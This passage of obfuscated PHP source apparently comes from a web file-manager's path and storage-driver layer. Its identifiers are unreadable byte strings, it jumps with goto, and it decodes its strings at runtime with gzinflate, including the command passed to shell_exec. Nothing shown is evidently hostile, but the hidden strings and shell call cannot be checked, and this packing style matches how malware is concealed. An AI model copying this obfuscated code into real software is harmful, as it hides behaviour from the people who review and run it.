¤˜Õ›ğ[87] => $œï—îüŸ, $ ¤˜Õ›ğ[1262] => !1, $ ¤˜Õ›ğ[1261] => $ ¤˜Õ›ğ[12]); if (is_array($¤Ãá¹ü ) && count($¤Ãá¹ü ) == 5) { $óóå¼šâ = $ ¤˜Õ›ğ[1366] . $¤Ãá¹ü [2] . $ ¤˜Õ›ğ[405]; if (in_array($óóå¼šâ, $¨Ó†—¯Ã)) { $­ÑÁŞüÉ[$ ¤˜Õ›ğ[1262]] = $¤Ãá¹ü [1]; $­ÑÁŞüÉ[$ ¤˜Õ›ğ[33]] = $óóå¼šâ; $­ÑÁŞüÉ[$ ¤˜Õ›ğ[1367]] = substr($óóå¼šâ, 1, -1); $­ÑÁŞüÉ[$ ¤˜Õ›ğ[478]] = $¤Ãá¹ü [3]; } $­ÑÁŞüÉ[$ ¤˜Õ›ğ[1261]] = $¤Ãá¹ü [4]; } if ($­ÑÁŞüÉ[$ ¤˜Õ›ğ[499]] == self::KOD_SOURCE) { $­ÑÁŞüÉ[$ ¤˜Õ›ğ[1265]] = $­ÑÁŞüÉ[$ ¤˜Õ›ğ[478]]; } $É˜çÕÑ = array($ ¤˜Õ›ğ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $­ÑÁŞüÉ[$ ¤˜Õ›ğ[1330]] = in_array($­ÑÁŞüÉ[$ ¤˜Õ›ğ[33]], $É˜çÕÑ); return $­ÑÁŞüÉ; } public static function isTruePath($¬‘ö ¡­) { $Ú¨íıÁ =& $_SERVER[¼¥ÊĞÙÌ]; if (substr($¬‘ö ¡­, 0, 1) != $Ú¨íıÁ[1366]) { return !0; } if (strpos($¬‘ö ¡­, $Ú¨íıÁ[486]) === 0) { return !0; } if (strpos($¬‘ö ¡­, $Ú¨íıÁ[1334]) === 0) { return !0; } if (strpos($¬‘ö ¡­, $Ú¨íıÁ[1368]) === 0) { return !0; } if (strpos($¬‘ö ¡­, $Ú¨íıÁ[1369]) === 0) { return !0; } if (strpos($¬‘ö ¡­, $Ú¨íıÁ[1370]) === 0) { return !0; } return !1; } public static function clear($ğó¶ëÇ) { $‡Ü„“¶¨ =& $_SERVER[¼¥ÊĞÙÌ]; $ğó¶ëÇ = str_replace(array($‡Ü„“¶¨[1166], $‡Ü„“¶¨[288]), $‡Ü„“¶¨[53], $ğó¶ëÇ); $ğó¶ëÇ = str_replace($‡Ü„“¶¨[100], $‡Ü„“¶¨[8], $ğó¶ëÇ); $ª æ±® = $‡Ü„“¶¨[1371]; if (substr($ğó¶ëÇ, 0, 3) == $‡Ü„“¶¨[1372]) { $ğó¶ëÇ = substr($ğó¶ëÇ, 3); } while (strstr($ğó¶ëÇ, $ª æ±®)) { $ğó¶ëÇ = str_replace($ª æ±®, $‡Ü„“¶¨[8], $ğó¶ëÇ); } $ğó¶ëÇ = preg_replace($‡Ü„“¶¨[1373], $‡Ü„“¶¨[8], $ğó¶ëÇ); if ($ğó¶ëÇ == $‡Ü„“¶¨[8]) { return $‡Ü„“¶¨[8]; } $ğó¶ëÇ = rtrim($ğó¶ëÇ, $‡Ü„“¶¨[8]); return $ğó¶ëÇ; } public static function pathTrue($‹¾ÎÓ‡Æ) { $¢ïÜÚ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$‹¾ÎÓ‡Æ) { return $¢ïÜÚ[12]; } $‹¾ÎÓ‡Æ = str_replace($¢ïÜÚ[257], $¢ïÜÚ[8], str_replace($¢ïÜÚ[1374], $¢ïÜÚ[8], $‹¾ÎÓ‡Æ)); $‹¾ÎÓ‡Æ = str_replace($¢ïÜÚ[257], $¢ïÜÚ[8], str_replace($¢ïÜÚ[1374], $¢ïÜÚ[8], $‹¾ÎÓ‡Æ)); if (!strstr($‹¾ÎÓ‡Æ, $¢ïÜÚ[1372])) { return $‹¾ÎÓ‡Æ; } $è¨áİ”¸ = explode($¢ïÜÚ[8], $‹¾ÎÓ‡Æ); foreach ($è¨áİ”¸ as $¶­Ş Éæ => $ÚšÓÊÛù) { if ($ÚšÓÊÛù !== $¢ïÜÚ[1375]) { continue; } for ($¹áÜÖá› = $¶­Ş Éæ; $¹áÜÖá› >= 0; $¹áÜÖá›--) { if ($è¨áİ”¸[$¹áÜÖá›] === $¢ïÜÚ[10] || $è¨áİ”¸[$¹áÜÖá›] === $¢ïÜÚ[1375] || $è¨áİ”¸[$¹áÜÖá›] === -1) { continue; } if ($è¨áİ”¸[$¹áÜÖá›] === $¢ïÜÚ[12]) { $è¨áİ”¸[$¶­Ş Éæ] = -1; break; } $è¨áİ”¸[$¶­Ş Éæ] = -1; $è¨áİ”¸[$¹áÜÖá›] = -1; break; } } $¯ŒÏøé‘ = array(); foreach ($è¨áİ”¸ as $ÚšÓÊÛù) { if ($ÚšÓÊÛù !== -1) { $¯ŒÏøé‘[] = $ÚšÓÊÛù; } } $ºÔ®Ÿß = implode($¢ïÜÚ[8], $¯ŒÏøé‘); if (strpos($ºÔ®Ÿß, $¢ïÜÚ[1376]) === 0) { $ºÔ®Ÿß = $¢ïÜÚ[1372] . substr($ºÔ®Ÿß, strlen($¢ïÜÚ[1376])); } return $ºÔ®Ÿß; } public static function pathUrlClear($‹òÍæĞ) { $Íšè”å =& $_SERVER[¼¥ÊĞÙÌ]; if (!$‹òÍæĞ) { return $‹òÍæĞ; } $‹òÍæĞ = rawurldecode($‹òÍæĞ); $‹òÍæĞ = str_replace($Íšè”å[1374], $Íšè”å[8], $‹òÍæĞ); if (strpos($‹òÍæĞ, $Íšè”å[76]) > 0) { $‹òÍæĞ = substr($‹òÍæĞ, 0, strpos($‹òÍæĞ, $Íšè”å[76])); } if (strpos($‹òÍæĞ, $Íšè”å[1377]) > 0) { $‹òÍæĞ = substr($‹òÍæĞ, 0, strpos($‹òÍæĞ, $Íšè”å[1377])); } return $‹òÍæĞ; } public static function sourceID($©ºÁøµ) { $å‡ùÌœŠ =& $_SERVER[¼¥ÊĞÙÌ]; $³ä¢‰Ù = self::parse($©ºÁøµ); if ($³ä¢‰Ù[$å‡ùÌœŠ[33]] !== self::KOD_SOURCE) { show_json(LNG($å‡ùÌœŠ[1378]), !1); } return $³ä¢‰Ù[$å‡ùÌœŠ[478]]; } public static function make($œê±¤òŸ) { if (!$œê±¤òŸ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($œê±¤òŸ)); } public static function makeShare($„‰î¶æ—, $ø¤ï™«¥) { return self::makePath(self::KOD_SHARE_ITEM, $„‰î¶æ—, $ø¤ï™«¥); } public static function makeFileTypePath($«¿ê–®Ÿ) { return self::makePath(self::KOD_USER_FILE_TYPE, $«¿ê–®Ÿ); } public static function makeFileTagPath($¶å·™ÎÆ) { return self::makePath(self::KOD_USER_FILE_TAG, $¶å·™ÎÆ); } public static function makePath($úéõˆ»¦, $ĞîÃ£Ö = '', $Äª´ÇÈÂ = '') { $¤ææ¶àŸ =& $_SERVER[¼¥ÊĞÙÌ]; $€³Ø•ŸÔ = substr($úéõˆ»¦, 1, -1); $´…éñáí = $¤ææ¶àŸ[1379] . $€³Ø•ŸÔ . $¤ææ¶àŸ[1380] . $ĞîÃ£Ö . $¤ææ¶àŸ[1381]; $´…éñáí = $Äª´ÇÈÂ ? $´…éñáí . $Äª´ÇÈÂ . $¤ææ¶àŸ[8] : $´…éñáí; return $´…éñáí; } public static function hashPath($ÊÍ“ªŠ½, $ˆàÃ”ò = false) { $ıÚü–ì =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ÊÍ“ªŠ½) { return $ıÚü–ì[12]; } $Â•§âÈ = is_array($ÊÍ“ªŠ½) ? $ÊÍ“ªŠ½ : IO::info($ÊÍ“ªŠ½); $ÌÌîªñ = _get($Â•§âÈ, $ıÚü–ì[1382], $ıÚü–ì[12]); if (!$ÌÌîªñ && isset($Â•§âÈ[$ıÚü–ì[238]])) { $ÌÌîªñ = trim($Â•§âÈ[$ıÚü–ì[238]], $ıÚü–ì[121]); } if ($ÌÌîªñ) { return $ÌÌîªñ; } if (!$ÌÌîªñ && isset($Â•§âÈ[$ıÚü–ì[194]]) && $Â•§âÈ[$ıÚü–ì[194]]) { $Â•§âÈ = IO::info(KodIO::make($Â•§âÈ[$ıÚü–ì[194]])); $ÌÌîªñ = _get($Â•§âÈ, $ıÚü–ì[1382], $ıÚü–ì[12]); } $üìÖœ‘« = md5($Â•§âÈ[$ıÚü–ì[87]] . $Â•§âÈ[$ıÚü–ì[79]] . $Â•§âÈ[$ıÚü–ì[88]]); $“Ö¸ÒŞ = $üìÖœ‘« . $ıÚü–ì[1383]; $ÌÌîªñ = $ÌÌîªñ ? $ÌÌîªñ : Cache::get($“Ö¸ÒŞ); if (!$ÌÌîªñ && $ˆàÃ”ò) { $ÌÌîªñ = IO::hashSimple($Â•§âÈ[$ıÚü–ì[87]]); Cache::set($“Ö¸ÒŞ, $ÌÌîªñ ? $ÌÌîªñ : $üìÖœ‘«, 3600 * 24 * 30); } return $ÌÌîªñ ? $ÌÌîªñ : $üìÖœ‘«; } public static function hashPathSafe($ñƒÑÏªñ, $®†ªƒìî = false) { $—äŠôö“ =& $_SERVER[¼¥ÊĞÙÌ]; $Æœ£Œ›Ú = self::hashPath($ñƒÑÏªñ, $®†ªƒìî); return md5($Æœ£Œ›Ú . $—äŠôö“[1384] . Model($—äŠôö“[844])->get($—äŠôö“[845])); } public static function initSystemPath() { $¹ğµƒ’‘ =& $_SERVER[¼¥ÊĞÙÌ]; if (defined($¹ğµƒ’‘[1385])) { return; } define($¹ğµƒ’‘[1385], self::systemPath($¹ğµƒ’‘[192])); define($¹ğµƒ’‘[1386], self::systemPath($¹ğµƒ’‘[1387])); define($¹ğµƒ’‘[1388], self::systemPath($¹ğµƒ’‘[1389])); define($¹ğµƒ’‘[1390], self::systemPath($¹ğµƒ’‘[1391])); IOHistory::bindEvent(); } public static function systemPath($Ê®ƒáÅ¶) { $…í­§ =& $_SERVER[¼¥ÊĞÙÌ]; $ü§‡ù– = $…í­§[1392] . ucfirst($Ê®ƒáÅ¶); $¿“ğ½½ˆ = Model($…í­§[844])->get($ü§‡ù–); if ($¿“ğ½½ˆ) { return $¿“ğ½½ˆ; } if ($Ê®ƒáÅ¶ == $…í­§[192]) { $¿“ğ½½ˆ = self::make(Model($…í­§[904])->systemRootPathAdd($…í­§[613])); } else { $¿“ğ½½ˆ = self::systemPath($…í­§[192]); $…¿óÌÕ = self::sourceID($¿“ğ½½ˆ); $¿“ğ½½ˆ = self::make(Model($…í­§[904])->mkdir($…¿óÌÕ, $Ê®ƒáÅ¶)); } Model($…í­§[844])->set($ü§‡ù–, $¿“ğ½½ˆ); return $¿“ğ½½ˆ; } public static function systemFolder($íá ‘¸Æ) { $Œ™ô«äÔ = IO_PATH_SYSTEM_SOURCE . $íá ‘¸Æ; $‹ƒŸ€ı = Cache::get($Œ™ô«äÔ); if (!$‹ƒŸ€ı) { $ìò¼òª = IO::infoFullSimple($Œ™ô«äÔ); if (!$ìò¼òª) { $‹ƒŸ€ı = IO::mkdir($Œ™ô«äÔ, REPEAT_SKIP); } else { $‹ƒŸ€ı = $ìò¼òª[$_SERVER[¼¥ÊĞÙÌ][87]]; } Cache::set($Œ™ô«äÔ, $‹ƒŸ€ı, 3600 * 10); } return $‹ƒŸ€ı; } public static function defaultDriver() { return Model($_SERVER[¼¥ÊĞÙÌ][841])->defaultDriver(); } public static function defaultDriverInit() { $ŸÆ Ñˆ =& $_SERVER[¼¥ÊĞÙÌ]; static $Öïş‰ = false; if ($Öïş‰) { return $Öïş‰; } $†»ı¬ = self::defaultDriver(); $Öïş‰ = IO::init($ŸÆ Ñˆ[1393] . $†»ı¬[$ŸÆ Ñˆ[478]] . $ŸÆ Ñˆ[1381]); return $Öïş‰; } public static function fileTypeList() { $ÜÈªÖª„ =& $_SERVER[¼¥ÊĞÙÌ]; $İ‚ËÏÕı = $GLOBALS[$ÜÈªÖª„[6]][$ÜÈªÖª„[1394]]; foreach ($İ‚ËÏÕı as $ı™Ö™ë½ => $Æ©ğŠ•÷) { $ıê´÷Æ¸ = $ÜÈªÖª„[1395] . $ı™Ö™ë½; $ØÚ”€½ò = LNG($ıê´÷Æ¸); if ($ıê´÷Æ¸ != $ØÚ”€½ò) { $İ‚ËÏÕı[$ı™Ö™ë½][$ÜÈªÖª„[32]] = $ØÚ”€½ò; } } return $İ‚ËÏÕı; } public static function ioFileDriverGet($«¼¬¬– = '') { $Êê­ªô =& $_SERVER[¼¥ÊĞÙÌ]; static $şŸ¼¹ò§ = array(); static $’³İÄ¼Ü = array(); static $Û“È§Ãç = array(); static $°„İíğ² = false; if ($°„İíğ² === !1) { $°„İíğ² = array($Êê­ªô[583] => array(), $Êê­ªô[670] => array()); $Ó•ï’­Ş = Model($Êê­ªô[1396])->get(!1, $Êê­ªô[1397]); foreach ($Ó•ï’­Ş as $’ª»îíÇ => $ÒàùÉØª) { if (!$ÒàùÉØª || $ÒàùÉØª == $Êê­ªô[12]) { continue; } if (strstr($’ª»îíÇ, $Êê­ªô[1398])) { $ÕéÑÒÌ‘ = str_replace($Êê­ªô[1398], $Êê­ªô[12], $’ª»îíÇ); $°„İíğ²[$Êê­ªô[583]][$ÕéÑÒÌ‘] = $ÒàùÉØª; } else { if (strstr($’ª»îíÇ, $Êê­ªô[1399])) { $ÕéÑÒÌ‘ = str_replace($Êê­ªô[1399], $Êê­ªô[12], $’ª»îíÇ); $°„İíğ²[$Êê­ªô[670]][$ÕéÑÒÌ‘] = $ÒàùÉØª; } } } } $¥ìå¶ÅÅ = self::defaultDriver(); if (!$«¼¬¬– || !$°„İíğ²[$Êê­ªô[583]] && !$°„İíğ²[$Êê­ªô[670]]) { return $¥ìå¶ÅÅ; } $ÆÁèĞ¡Ø = self::getPathSourceID($«¼¬¬–); if (!$ÆÁèĞ¡Ø) { return $¥ìå¶ÅÅ; } if (isset($şŸ¼¹ò§[$ÆÁèĞ¡Ø])) { return $şŸ¼¹ò§[$ÆÁèĞ¡Ø]; } $¨’ê€—À = Model($Êê­ªô[904])->sourceInfo($ÆÁèĞ¡Ø); $ç‹ŠË² = $¨’ê€—À[$Êê­ªô[574]]; $×¿Á³š¯ = array(); if (!$¨’ê€—À) { return $¥ìå¶ÅÅ; } if ($¨’ê€—À[$Êê­ªô[191]] == $Êê­ªô[91]) { if (isset($Û“È§Ãç[$ç‹ŠË²])) { return $Û“È§Ãç[$ç‹ŠË²]; } if (isset($°„İíğ²[$Êê­ªô[670]][$ç‹ŠË²])) { $„Î¥æøµ = Model($Êê­ªô[841])->driverInfo($°„İíğ²[$Êê­ªô[670]][$ç‹ŠË²]); $¥ìå¶ÅÅ = $„Î¥æøµ ? $„Î¥æøµ : $¥ìå¶ÅÅ; $Û“È§Ãç[$ç‹ŠË²] = $¥ìå¶ÅÅ; $şŸ¼¹ò§[$ÆÁèĞ¡Ø] = $¥ìå¶ÅÅ; return $¥ìå¶ÅÅ; } $×¿Á³š¯ = self::groupParentUser($ç‹ŠË²); } else { if ($¨’ê€—À[$Êê­ªô[191]] == $Êê­ªô[513]) { $ÏÌ²¨á÷ = Model($Êê­ªô[1400])->getInfo($ç‹ŠË²); if ($ÏÌ²¨á÷) { $×¿Á³š¯ = explode($Êê­ªô[50], trim($ÏÌ²¨á÷[$Êê­ªô[589]], $Êê­ªô[50])); $×¿Á³š¯ = array_remove_value($×¿Á³š¯, $Êê­ªô[231]); $×¿Á³š¯[] = $ç‹ŠË²; $×¿Á³š¯ = array_reverse($×¿Á³š¯); } } } foreach ($×¿Á³š¯ as $µ§ÇÔ†) { if (!isset($°„İíğ²[$Êê­ªô[583]][$µ§ÇÔ†])) { continue; } if (isset($’³İÄ¼Ü[$µ§ÇÔ†])) { return $’³İÄ¼Ü[$µ§ÇÔ†]; } $„Î¥æøµ = Model($Êê­ªô[841])->driverInfo($°„İíğ²[$Êê­ªô[583]][$µ§ÇÔ†]); $¥ìå¶ÅÅ = $„Î¥æøµ ? $„Î¥æøµ : $¥ìå¶ÅÅ; $’³İÄ¼Ü[$µ§ÇÔ†] = $¥ìå¶ÅÅ; break; } if ($¨’ê€—À[$Êê­ªô[191]] == $Êê­ªô[91]) { $Û“È§Ãç[$ç‹ŠË²] = $¥ìå¶ÅÅ; } $şŸ¼¹ò§[$ÆÁèĞ¡Ø] = $¥ìå¶ÅÅ; return $¥ìå¶ÅÅ; } private static function getPathSourceID($ÓßøöŠË) { $Æ­¨„ó¹ =& $_SERVER[¼¥ÊĞÙÌ]; static $Ô·ûĞ®œ = array(); if (!$ÓßøöŠË) { return $Æ­¨„ó¹[12]; } $ËùõáÓ¼ = substr($ÓßøöŠË, 0, strlen($Æ­¨„ó¹[486])) == $Æ­¨„ó¹[486]; $¤Ä°©âÈ = substr($ÓßøöŠË, 0, strlen($Æ­¨„ó¹[1368])) == $Æ­¨„ó¹[1368]; $¯Üãàã¯ = substr($ÓßøöŠË, 0, strlen($Æ­¨„ó¹[1369])) == $Æ­¨„ó¹[1369]; if (!$ËùõáÓ¼ && !$¤Ä°©âÈ && !$¯Üãàã¯) { return $Æ­¨„ó¹[12]; } $ÕÜ†‘Íß = self::parse($ÓßøöŠË); $Á©›¡ = $ÕÜ†‘Íß[$Æ­¨„ó¹[1262]]; if ($ËùõáÓ¼) { return $ÕÜ†‘Íß[$Æ­¨„ó¹[478]]; } if (isset($Ô·ûĞ®œ[$Á©›¡])) { $ªËí×¡é = $Ô·ûĞ®œ[$Á©›¡]; } else { $ªËí×¡é = IO::init($Á©›¡); $Ô·ûĞ®œ[$Á©›¡] = $ªËí×¡é; } if (isset($ªËí×¡é->pathParse[$Æ­¨„ó¹[1265]])) { return $ªËí×¡é->pathParse[$Æ­¨„ó¹[1265]]; } return $Æ­¨„ó¹[12]; } private static function groupParentUser($ÌŸ¿üßâ) { $ï×€˜–Ó =& $_SERVER[¼¥ÊĞÙÌ]; $€õ¢°­ = Model($ï×€˜–Ó[602])->getInfo($ÌŸ¿üßâ); if (!$€õ¢°­) { return array(); } $©¨Şğ´ = array_to_keyvalue($€õ¢°­[$ï×€˜–Ó[1401]], $ï×€˜–Ó[12], $ï×€˜–Ó[1402]); $‡¿¯³‰ = array(); foreach ($€õ¢°­[$ï×€˜–Ó[1401]] as $şíÌÀ¸Œ) { $‡¿¯³‰[] = $şíÌÀ¸Œ[$ï×€˜–Ó[1402]]; $İÓà£ » = explode($ï×€˜–Ó[50], trim($şíÌÀ¸Œ[$ï×€˜–Ó[589]], $ï×€˜–Ó[50])); $İÓà£ » = array_remove_value($İÓà£ », $ï×€˜–Ó[231]); $İÓà£ » = array_reverse($İÓà£ »); $‡¿¯³‰ = array_merge($‡¿¯³‰, $İÓà£ »); } return array_unique($‡¿¯³‰); } public static function diskList($Ï½úüÉƒ = true) { $ÑÕ³öš± = $_SERVER[¼¥ÊĞÙÌ][1403]; if ($Ï½úüÉƒ) { $á…ª˜ù­ = Cache::get($ÑÕ³öš±); if (is_array($á…ª˜ù­)) { return $á…ª˜ù­; } } $á…ª˜ù­ = self::diskListGet(); Cache::set($ÑÕ³öš±, $á…ª˜ù­, 60); return $á…ª˜ù­; } public static function diskListGet() { $¿¬Ş•Î° =& $_SERVER[¼¥ÊĞÙÌ]; $ŞİÆÍ¾˜ = array(); if ($GLOBALS[$¿¬Ş•Î°[6]][$¿¬Ş•Î°[1404]] == $¿¬Ş•Î°[1405]) { $ñÖÙÏõò = $¿¬Ş•Î°[1406]; for ($Íšï„ê¿ = 0; $Íšï„ê¿ < strlen($ñÖÙÏõò); $Íšï„ê¿++) { $ÄÒ‘â = $ñÖÙÏõò[$Íšï„ê¿] . $¿¬Ş•Î°[1407]; if (file_exists($ÄÒ‘â)) { $ŞİÆÍ¾˜[] = $ÄÒ‘â; } } return $ŞİÆÍ¾˜; } if (!function_exists($¿¬Ş•Î°[101])) { $ŞİÆÍ¾˜[] = $¿¬Ş•Î°[915]; return $ŞİÆÍ¾˜; } $ÏÚ½¢„– = explode($¿¬Ş•Î°[288], shell_exec($¿¬Ş•Î°[1408])); array_shift($ÏÚ½¢„–); array_pop($ÏÚ½¢„–); $½ìË§– = array($¿¬Ş•Î°[1409], $¿¬Ş•Î°[1410], $¿¬Ş•Î°[1411], $¿¬Ş•Î°[1412], $¿¬Ş•Î°[1413], $¿¬Ş•Î°[1414], $¿¬Ş•Î°[1415], $¿¬Ş•Î°[1416]); foreach ($ÏÚ½¢„– as $Üõ¸Ğıİ) { $õ”¶öŞ” = preg_split($¿¬Ş•Î°[1417], $Üõ¸Ğıİ); $ÄÒ‘â = $õ”¶öŞ”[count($õ”¶öŞ”) - 1]; if (!strstr($õ”¶öŞ”[0], $¿¬Ş•Î°[1418]) || !$ÄÒ‘â) { continue; } $µøæ‘¬¸ = rtrim($ÄÒ‘â, $¿¬Ş•Î°[8]) . $¿¬Ş•Î°[8]; if (in_array($µøæ‘¬¸, $½ìË§–)) { continue; } $ŞİÆÍ¾˜[] = $µøæ‘¬¸; } return $ŞİÆÍ¾˜; } public static function isSameDisk($±ÕóùÒü, $¾œİ¯îü) { $ºà‡é´ =& $_SERVER[¼¥ÊĞÙÌ]; if ($GLOBALS[$ºà‡é´[6]][$ºà‡é´[1404]] == $ºà‡é´[1405]) { return strtolower(substr($±ÕóùÒü, 0, 1)) == strtolower(substr($¾œİ¯îü, 0, 1)); } $ˆæ¯ÄŸ¹ = stat($±ÕóùÒü); $âîÂ‚Äõ = stat($¾œİ¯îü); if ($ˆæ¯ÄŸ¹ === !1 || $âîÂ‚Äõ === !1) { return !1; } return $ˆæ¯ÄŸ¹[$ºà‡é´[1419]] === $âîÂ‚Äõ[$ºà‡é´[1419]]; $½Ê¢Æ… = self::diskList(); $Ù‡ØşÛ = !1; $™·½»•ç = !1; sort($½Ê¢Æ…); $½Ê¢Æ… = array_reverse($½Ê¢Æ…); $±ÕóùÒü = rtrim($±ÕóùÒü, $ºà‡é´[8]) . $ºà‡é´[8]; $¾œİ¯îü = rtrim($¾œİ¯îü, $ºà‡é´[8]) . $ºà‡é´[8]; foreach ($½Ê¢Æ… as $Æ´³€ƒµ) { $¬¯çƒâ = strlen($Æ´³€ƒµ); if (!$Ù‡ØşÛ && substr($±ÕóùÒü, 0, $¬¯çƒâ) == $Æ´³€ƒµ) { $Ù‡ØşÛ = $Æ´³€ƒµ; } if (!$™·½»•ç && substr($¾œİ¯îü, 0, $¬¯çƒâ) == $Æ´³€ƒµ) { $™·½»•ç = $Æ´³€ƒµ; } if ($Ù‡ØşÛ && $™·½»•ç) { break; } } return $Ù‡ØşÛ === $™·½»•ç; } public static function transferType($­Ÿ®´”Ì, $†½óÊ¢Ä) { $¸’ Ö˜á =& $_SERVER[¼¥ÊĞÙÌ]; $Åø¸×Ï = self::driverType($­Ÿ®´”Ì); $—íÏê©´ = self::driverType($†½óÊ¢Ä); if ($Åø¸×Ï[$¸’ Ö˜á[33]] == $—íÏê©´[$¸’ Ö˜á[33]] && $Åø¸×Ï[$¸’ Ö˜á[1420]] == $—íÏê©´[$¸’ Ö˜á[1420]]) { return $¸’ Ö˜á[1421]; } if ($Åø¸×Ï[$¸’ Ö˜á[33]] == $¸’ Ö˜á[949] && $—íÏê©´[$¸’ Ö˜á[33]] == $¸’ Ö˜á[109]) { return $¸’ Ö˜á[1291]; } if ($Åø¸×Ï[$¸’ Ö˜á[33]] == $¸’ Ö˜á[109] && $—íÏê©´[$¸’ Ö˜á[33]] == $¸’ Ö˜á[949]) { return $¸’ Ö˜á[110]; } return $¸’ Ö˜á[1422]; } public static function driverType($ô•…É‰ñ) { $ä­™”«Æ =& $_SERVER[¼¥ÊĞÙÌ]; $“Ş×‘» = str_replace($ä­™”«Æ[1423], $ä­™”«Æ[12], strtolower($ô•…É‰ñ->getType())); if ($“Ş×‘» == $ä­™”«Æ[831] || $“Ş×‘» == $ä­™”«Æ[1424] || $“Ş×‘» == $ä­™”«Æ[1425]) { $Ë¹¢ÓÛ† = self::ioFileDriverGet($ä­™”«Æ[486] . $ô•…É‰ñ->pathParse[$ä­™”«Æ[1265]] . $ä­™”«Æ[405]); $ô•…É‰ñ = IO::init($ä­™”«Æ[1393] . $Ë¹¢ÓÛ†[$ä­™”«Æ[478]] . $ä­™”«Æ[1381]); } else { if ($“Ş×‘» == $ä­™”«Æ[1301] || $“Ş×‘» == $ä­™”«Æ[1426]) { $ô•…É‰ñ = IO::init($ô•…É‰ñ->pathParse[$ä­™”«Æ[1242]]); } } $Ø¸—õşñ = $ô•…É‰ñ->path; $“Ş×‘» = str_replace($ä­™”«Æ[1423], $ä­™”«Æ[12], strtolower($ô•…É‰ñ->getType())); if ($“Ş×‘» == $ä­™”«Æ[109]) { return array($ä­™”«Æ[33] => $ä­™”«Æ[109], $ä­™”«Æ[1420] => $ä­™”«Æ[12], $ä­™”«Æ[87] => $Ø¸—õşñ, $ä­™”«Æ[98] => $ô•…É‰ñ); } return array($ä­™”«Æ[33] => $ä­™”«Æ[949], $ä­™”«Æ[1420] => $ô•…É‰ñ->pathDriver, $ä­™”«Æ[87] => $Ø¸—õşñ, $ä­™”«Æ[98] => $ô•…É‰ñ); } public static function pathDriverType($úô¯·˜¥) { return $úô¯·˜¥ ? self::driverType(IO::init($úô¯·˜¥)) : !1; } public static function pathDriverLocal($êÌµóä¬) { $…Äø¸¡ =& $_SERVER[¼¥ÊĞÙÌ]; $à÷ÎÀğÕ = $êÌµóä¬ ? self::driverType(IO::init($êÌµóä¬)) : !1; return strtolower($à÷ÎÀğÕ[$…Äø¸¡[33]]) == $…Äø¸¡[109] ? !0 : !1; } public static function allowCover($Ãº¥£åğ, $Ô¿Ğ‹§ = true) { $£ÙíÑŞ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($Ãº¥£åğ)) { $Ãº¥£åğ = IO::info($Ãº¥£åğ); } if (!$Ãº¥£åğ || $Ãº¥£åğ[$£ÙíÑŞ[33]] == $£ÙíÑŞ[78] || $Ãº¥£åğ[$£ÙíÑŞ[79]] <= 100) { return !1; } if (isset($Ãº¥£åğ[$£ÙíÑŞ[1427]]) || !$Ãº¥£åğ[$£ÙíÑŞ[87]]) { return !1; } if (isset($Ãº¥£åğ[$£ÙíÑŞ[235]]) && !$Ãº¥£åğ[$£ÙíÑŞ[235]]) { return !1; } static $†³£¨Æ = false; if (!$†³£¨Æ || !$Ô¿Ğ‹§) { $“²ƒ¢• = self::driverType(IO::init($Ãº¥£åğ[$£ÙíÑŞ[87]])); $ÙæúÓ­ = $“²ƒ¢•[$£ÙíÑŞ[98]]; $†³£¨Æ = $£ÙíÑŞ[197]; if ($“²ƒ¢•[$£ÙíÑŞ[33]] == $£ÙíÑŞ[109]) { $†³£¨Æ = $£ÙíÑŞ[1428]; } if ($“²ƒ¢•[$£ÙíÑŞ[98]] && is_array($“²ƒ¢•[$£ÙíÑŞ[98]]->config)) { $§ÍºÚò = $“²ƒ¢•[$£ÙíÑŞ[98]]->config; if (isset($§ÍºÚò[$£ÙíÑŞ[1429]]) && $§ÍºÚò[$£ÙíÑŞ[1429]]) { $†³£¨Æ = $£ÙíÑŞ[1428]; } } $ù…ãÑë³ = KodIO::defaultDriver(); if (strtolower($ù…ãÑë³[$£ÙíÑŞ[98]]) == $£ÙíÑŞ[109] && is_array($ù…ãÑë³[$£ÙíÑŞ[6]])) { $ÅÀ‹‡ˆª = $ù…ãÑë³[$£ÙíÑŞ[6]][$£ÙíÑŞ[1274]]; if (substr($ÅÀ‹‡ˆª, 0, 2) == $£ÙíÑŞ[1430]) { $ÅÀ‹‡ˆª = str_replace($£ÙíÑŞ[1430], BASIC_PATH, $ÅÀ‹‡ˆª); } $ÅÀ‹‡ˆª = str_replace($£ÙíÑŞ[257], $£ÙíÑŞ[8], $ÅÀ‹‡ˆª); if (substr($Ãº¥£åğ[$£ÙíÑŞ[87]], 0, strlen($ÅÀ‹‡ˆª)) == $ÅÀ‹‡ˆª) { $†³£¨Æ = $£ÙíÑŞ[197]; } } } return $†³£¨Æ == $£ÙíÑŞ[1428] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($û¼‰› ×) { parent::__construct($û¼‰› ×); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto EŒÃ‚Í¼¾Ò; C½©˜‚‘ğ„: define($_SERVER[¼¥ÊĞÙÌ][0], $_SERVER[¼¥ÊĞÙÌ][1]); $_SERVER[ŸÅ®¥²] = explode($_SERVER[¼¥ÊĞÙÌ][2], gzinflate(substr($_SERVER[¼¥ÊĞÙÌ][3], 10, -8))); function binCheckEq($Õ”èıê×, $Ş„°ƒ®â) { return $Õ”èıê× == $Ş„°ƒ®â; } goto AìÈ•Ş†¿Û; cò”Ô•½ñï: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x72\x6f\x6c\145\114\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\141\x75\x74\150", "\154\141\142\x65\x6c", "\x64\x69\x73\160\154\x61\171", "\x73\x79\163\x74\x65\x6d", "\144\x65\163\x63", "\151\x67\x6e\157\x72\145\105\170\164", "\151\147\156\x6f\162\x65\x46\151\x6c\x65\123\151\x7a\x65", "\141\x64\x6d\151\x6e\151\163\164\x72\141\164\157\162", "\x73\157\x72\x74"); public function listData($¦Õï… = false, $ßÈÙ÷ù = "\163\157\162\164", $…ì¶Ö»¢ = false) { $ÍÎ‡ª¤Í =& $_SERVER[¼¥ÊĞÙÌ]; $½á¢şû› = parent::listData($¦Õï…, $ßÈÙ÷ù, $…ì¶Ö»¢); if (!$¦Õï…) { foreach ($½á¢şû› as $õÍ™úİš => $²ÛĞÍ) { if 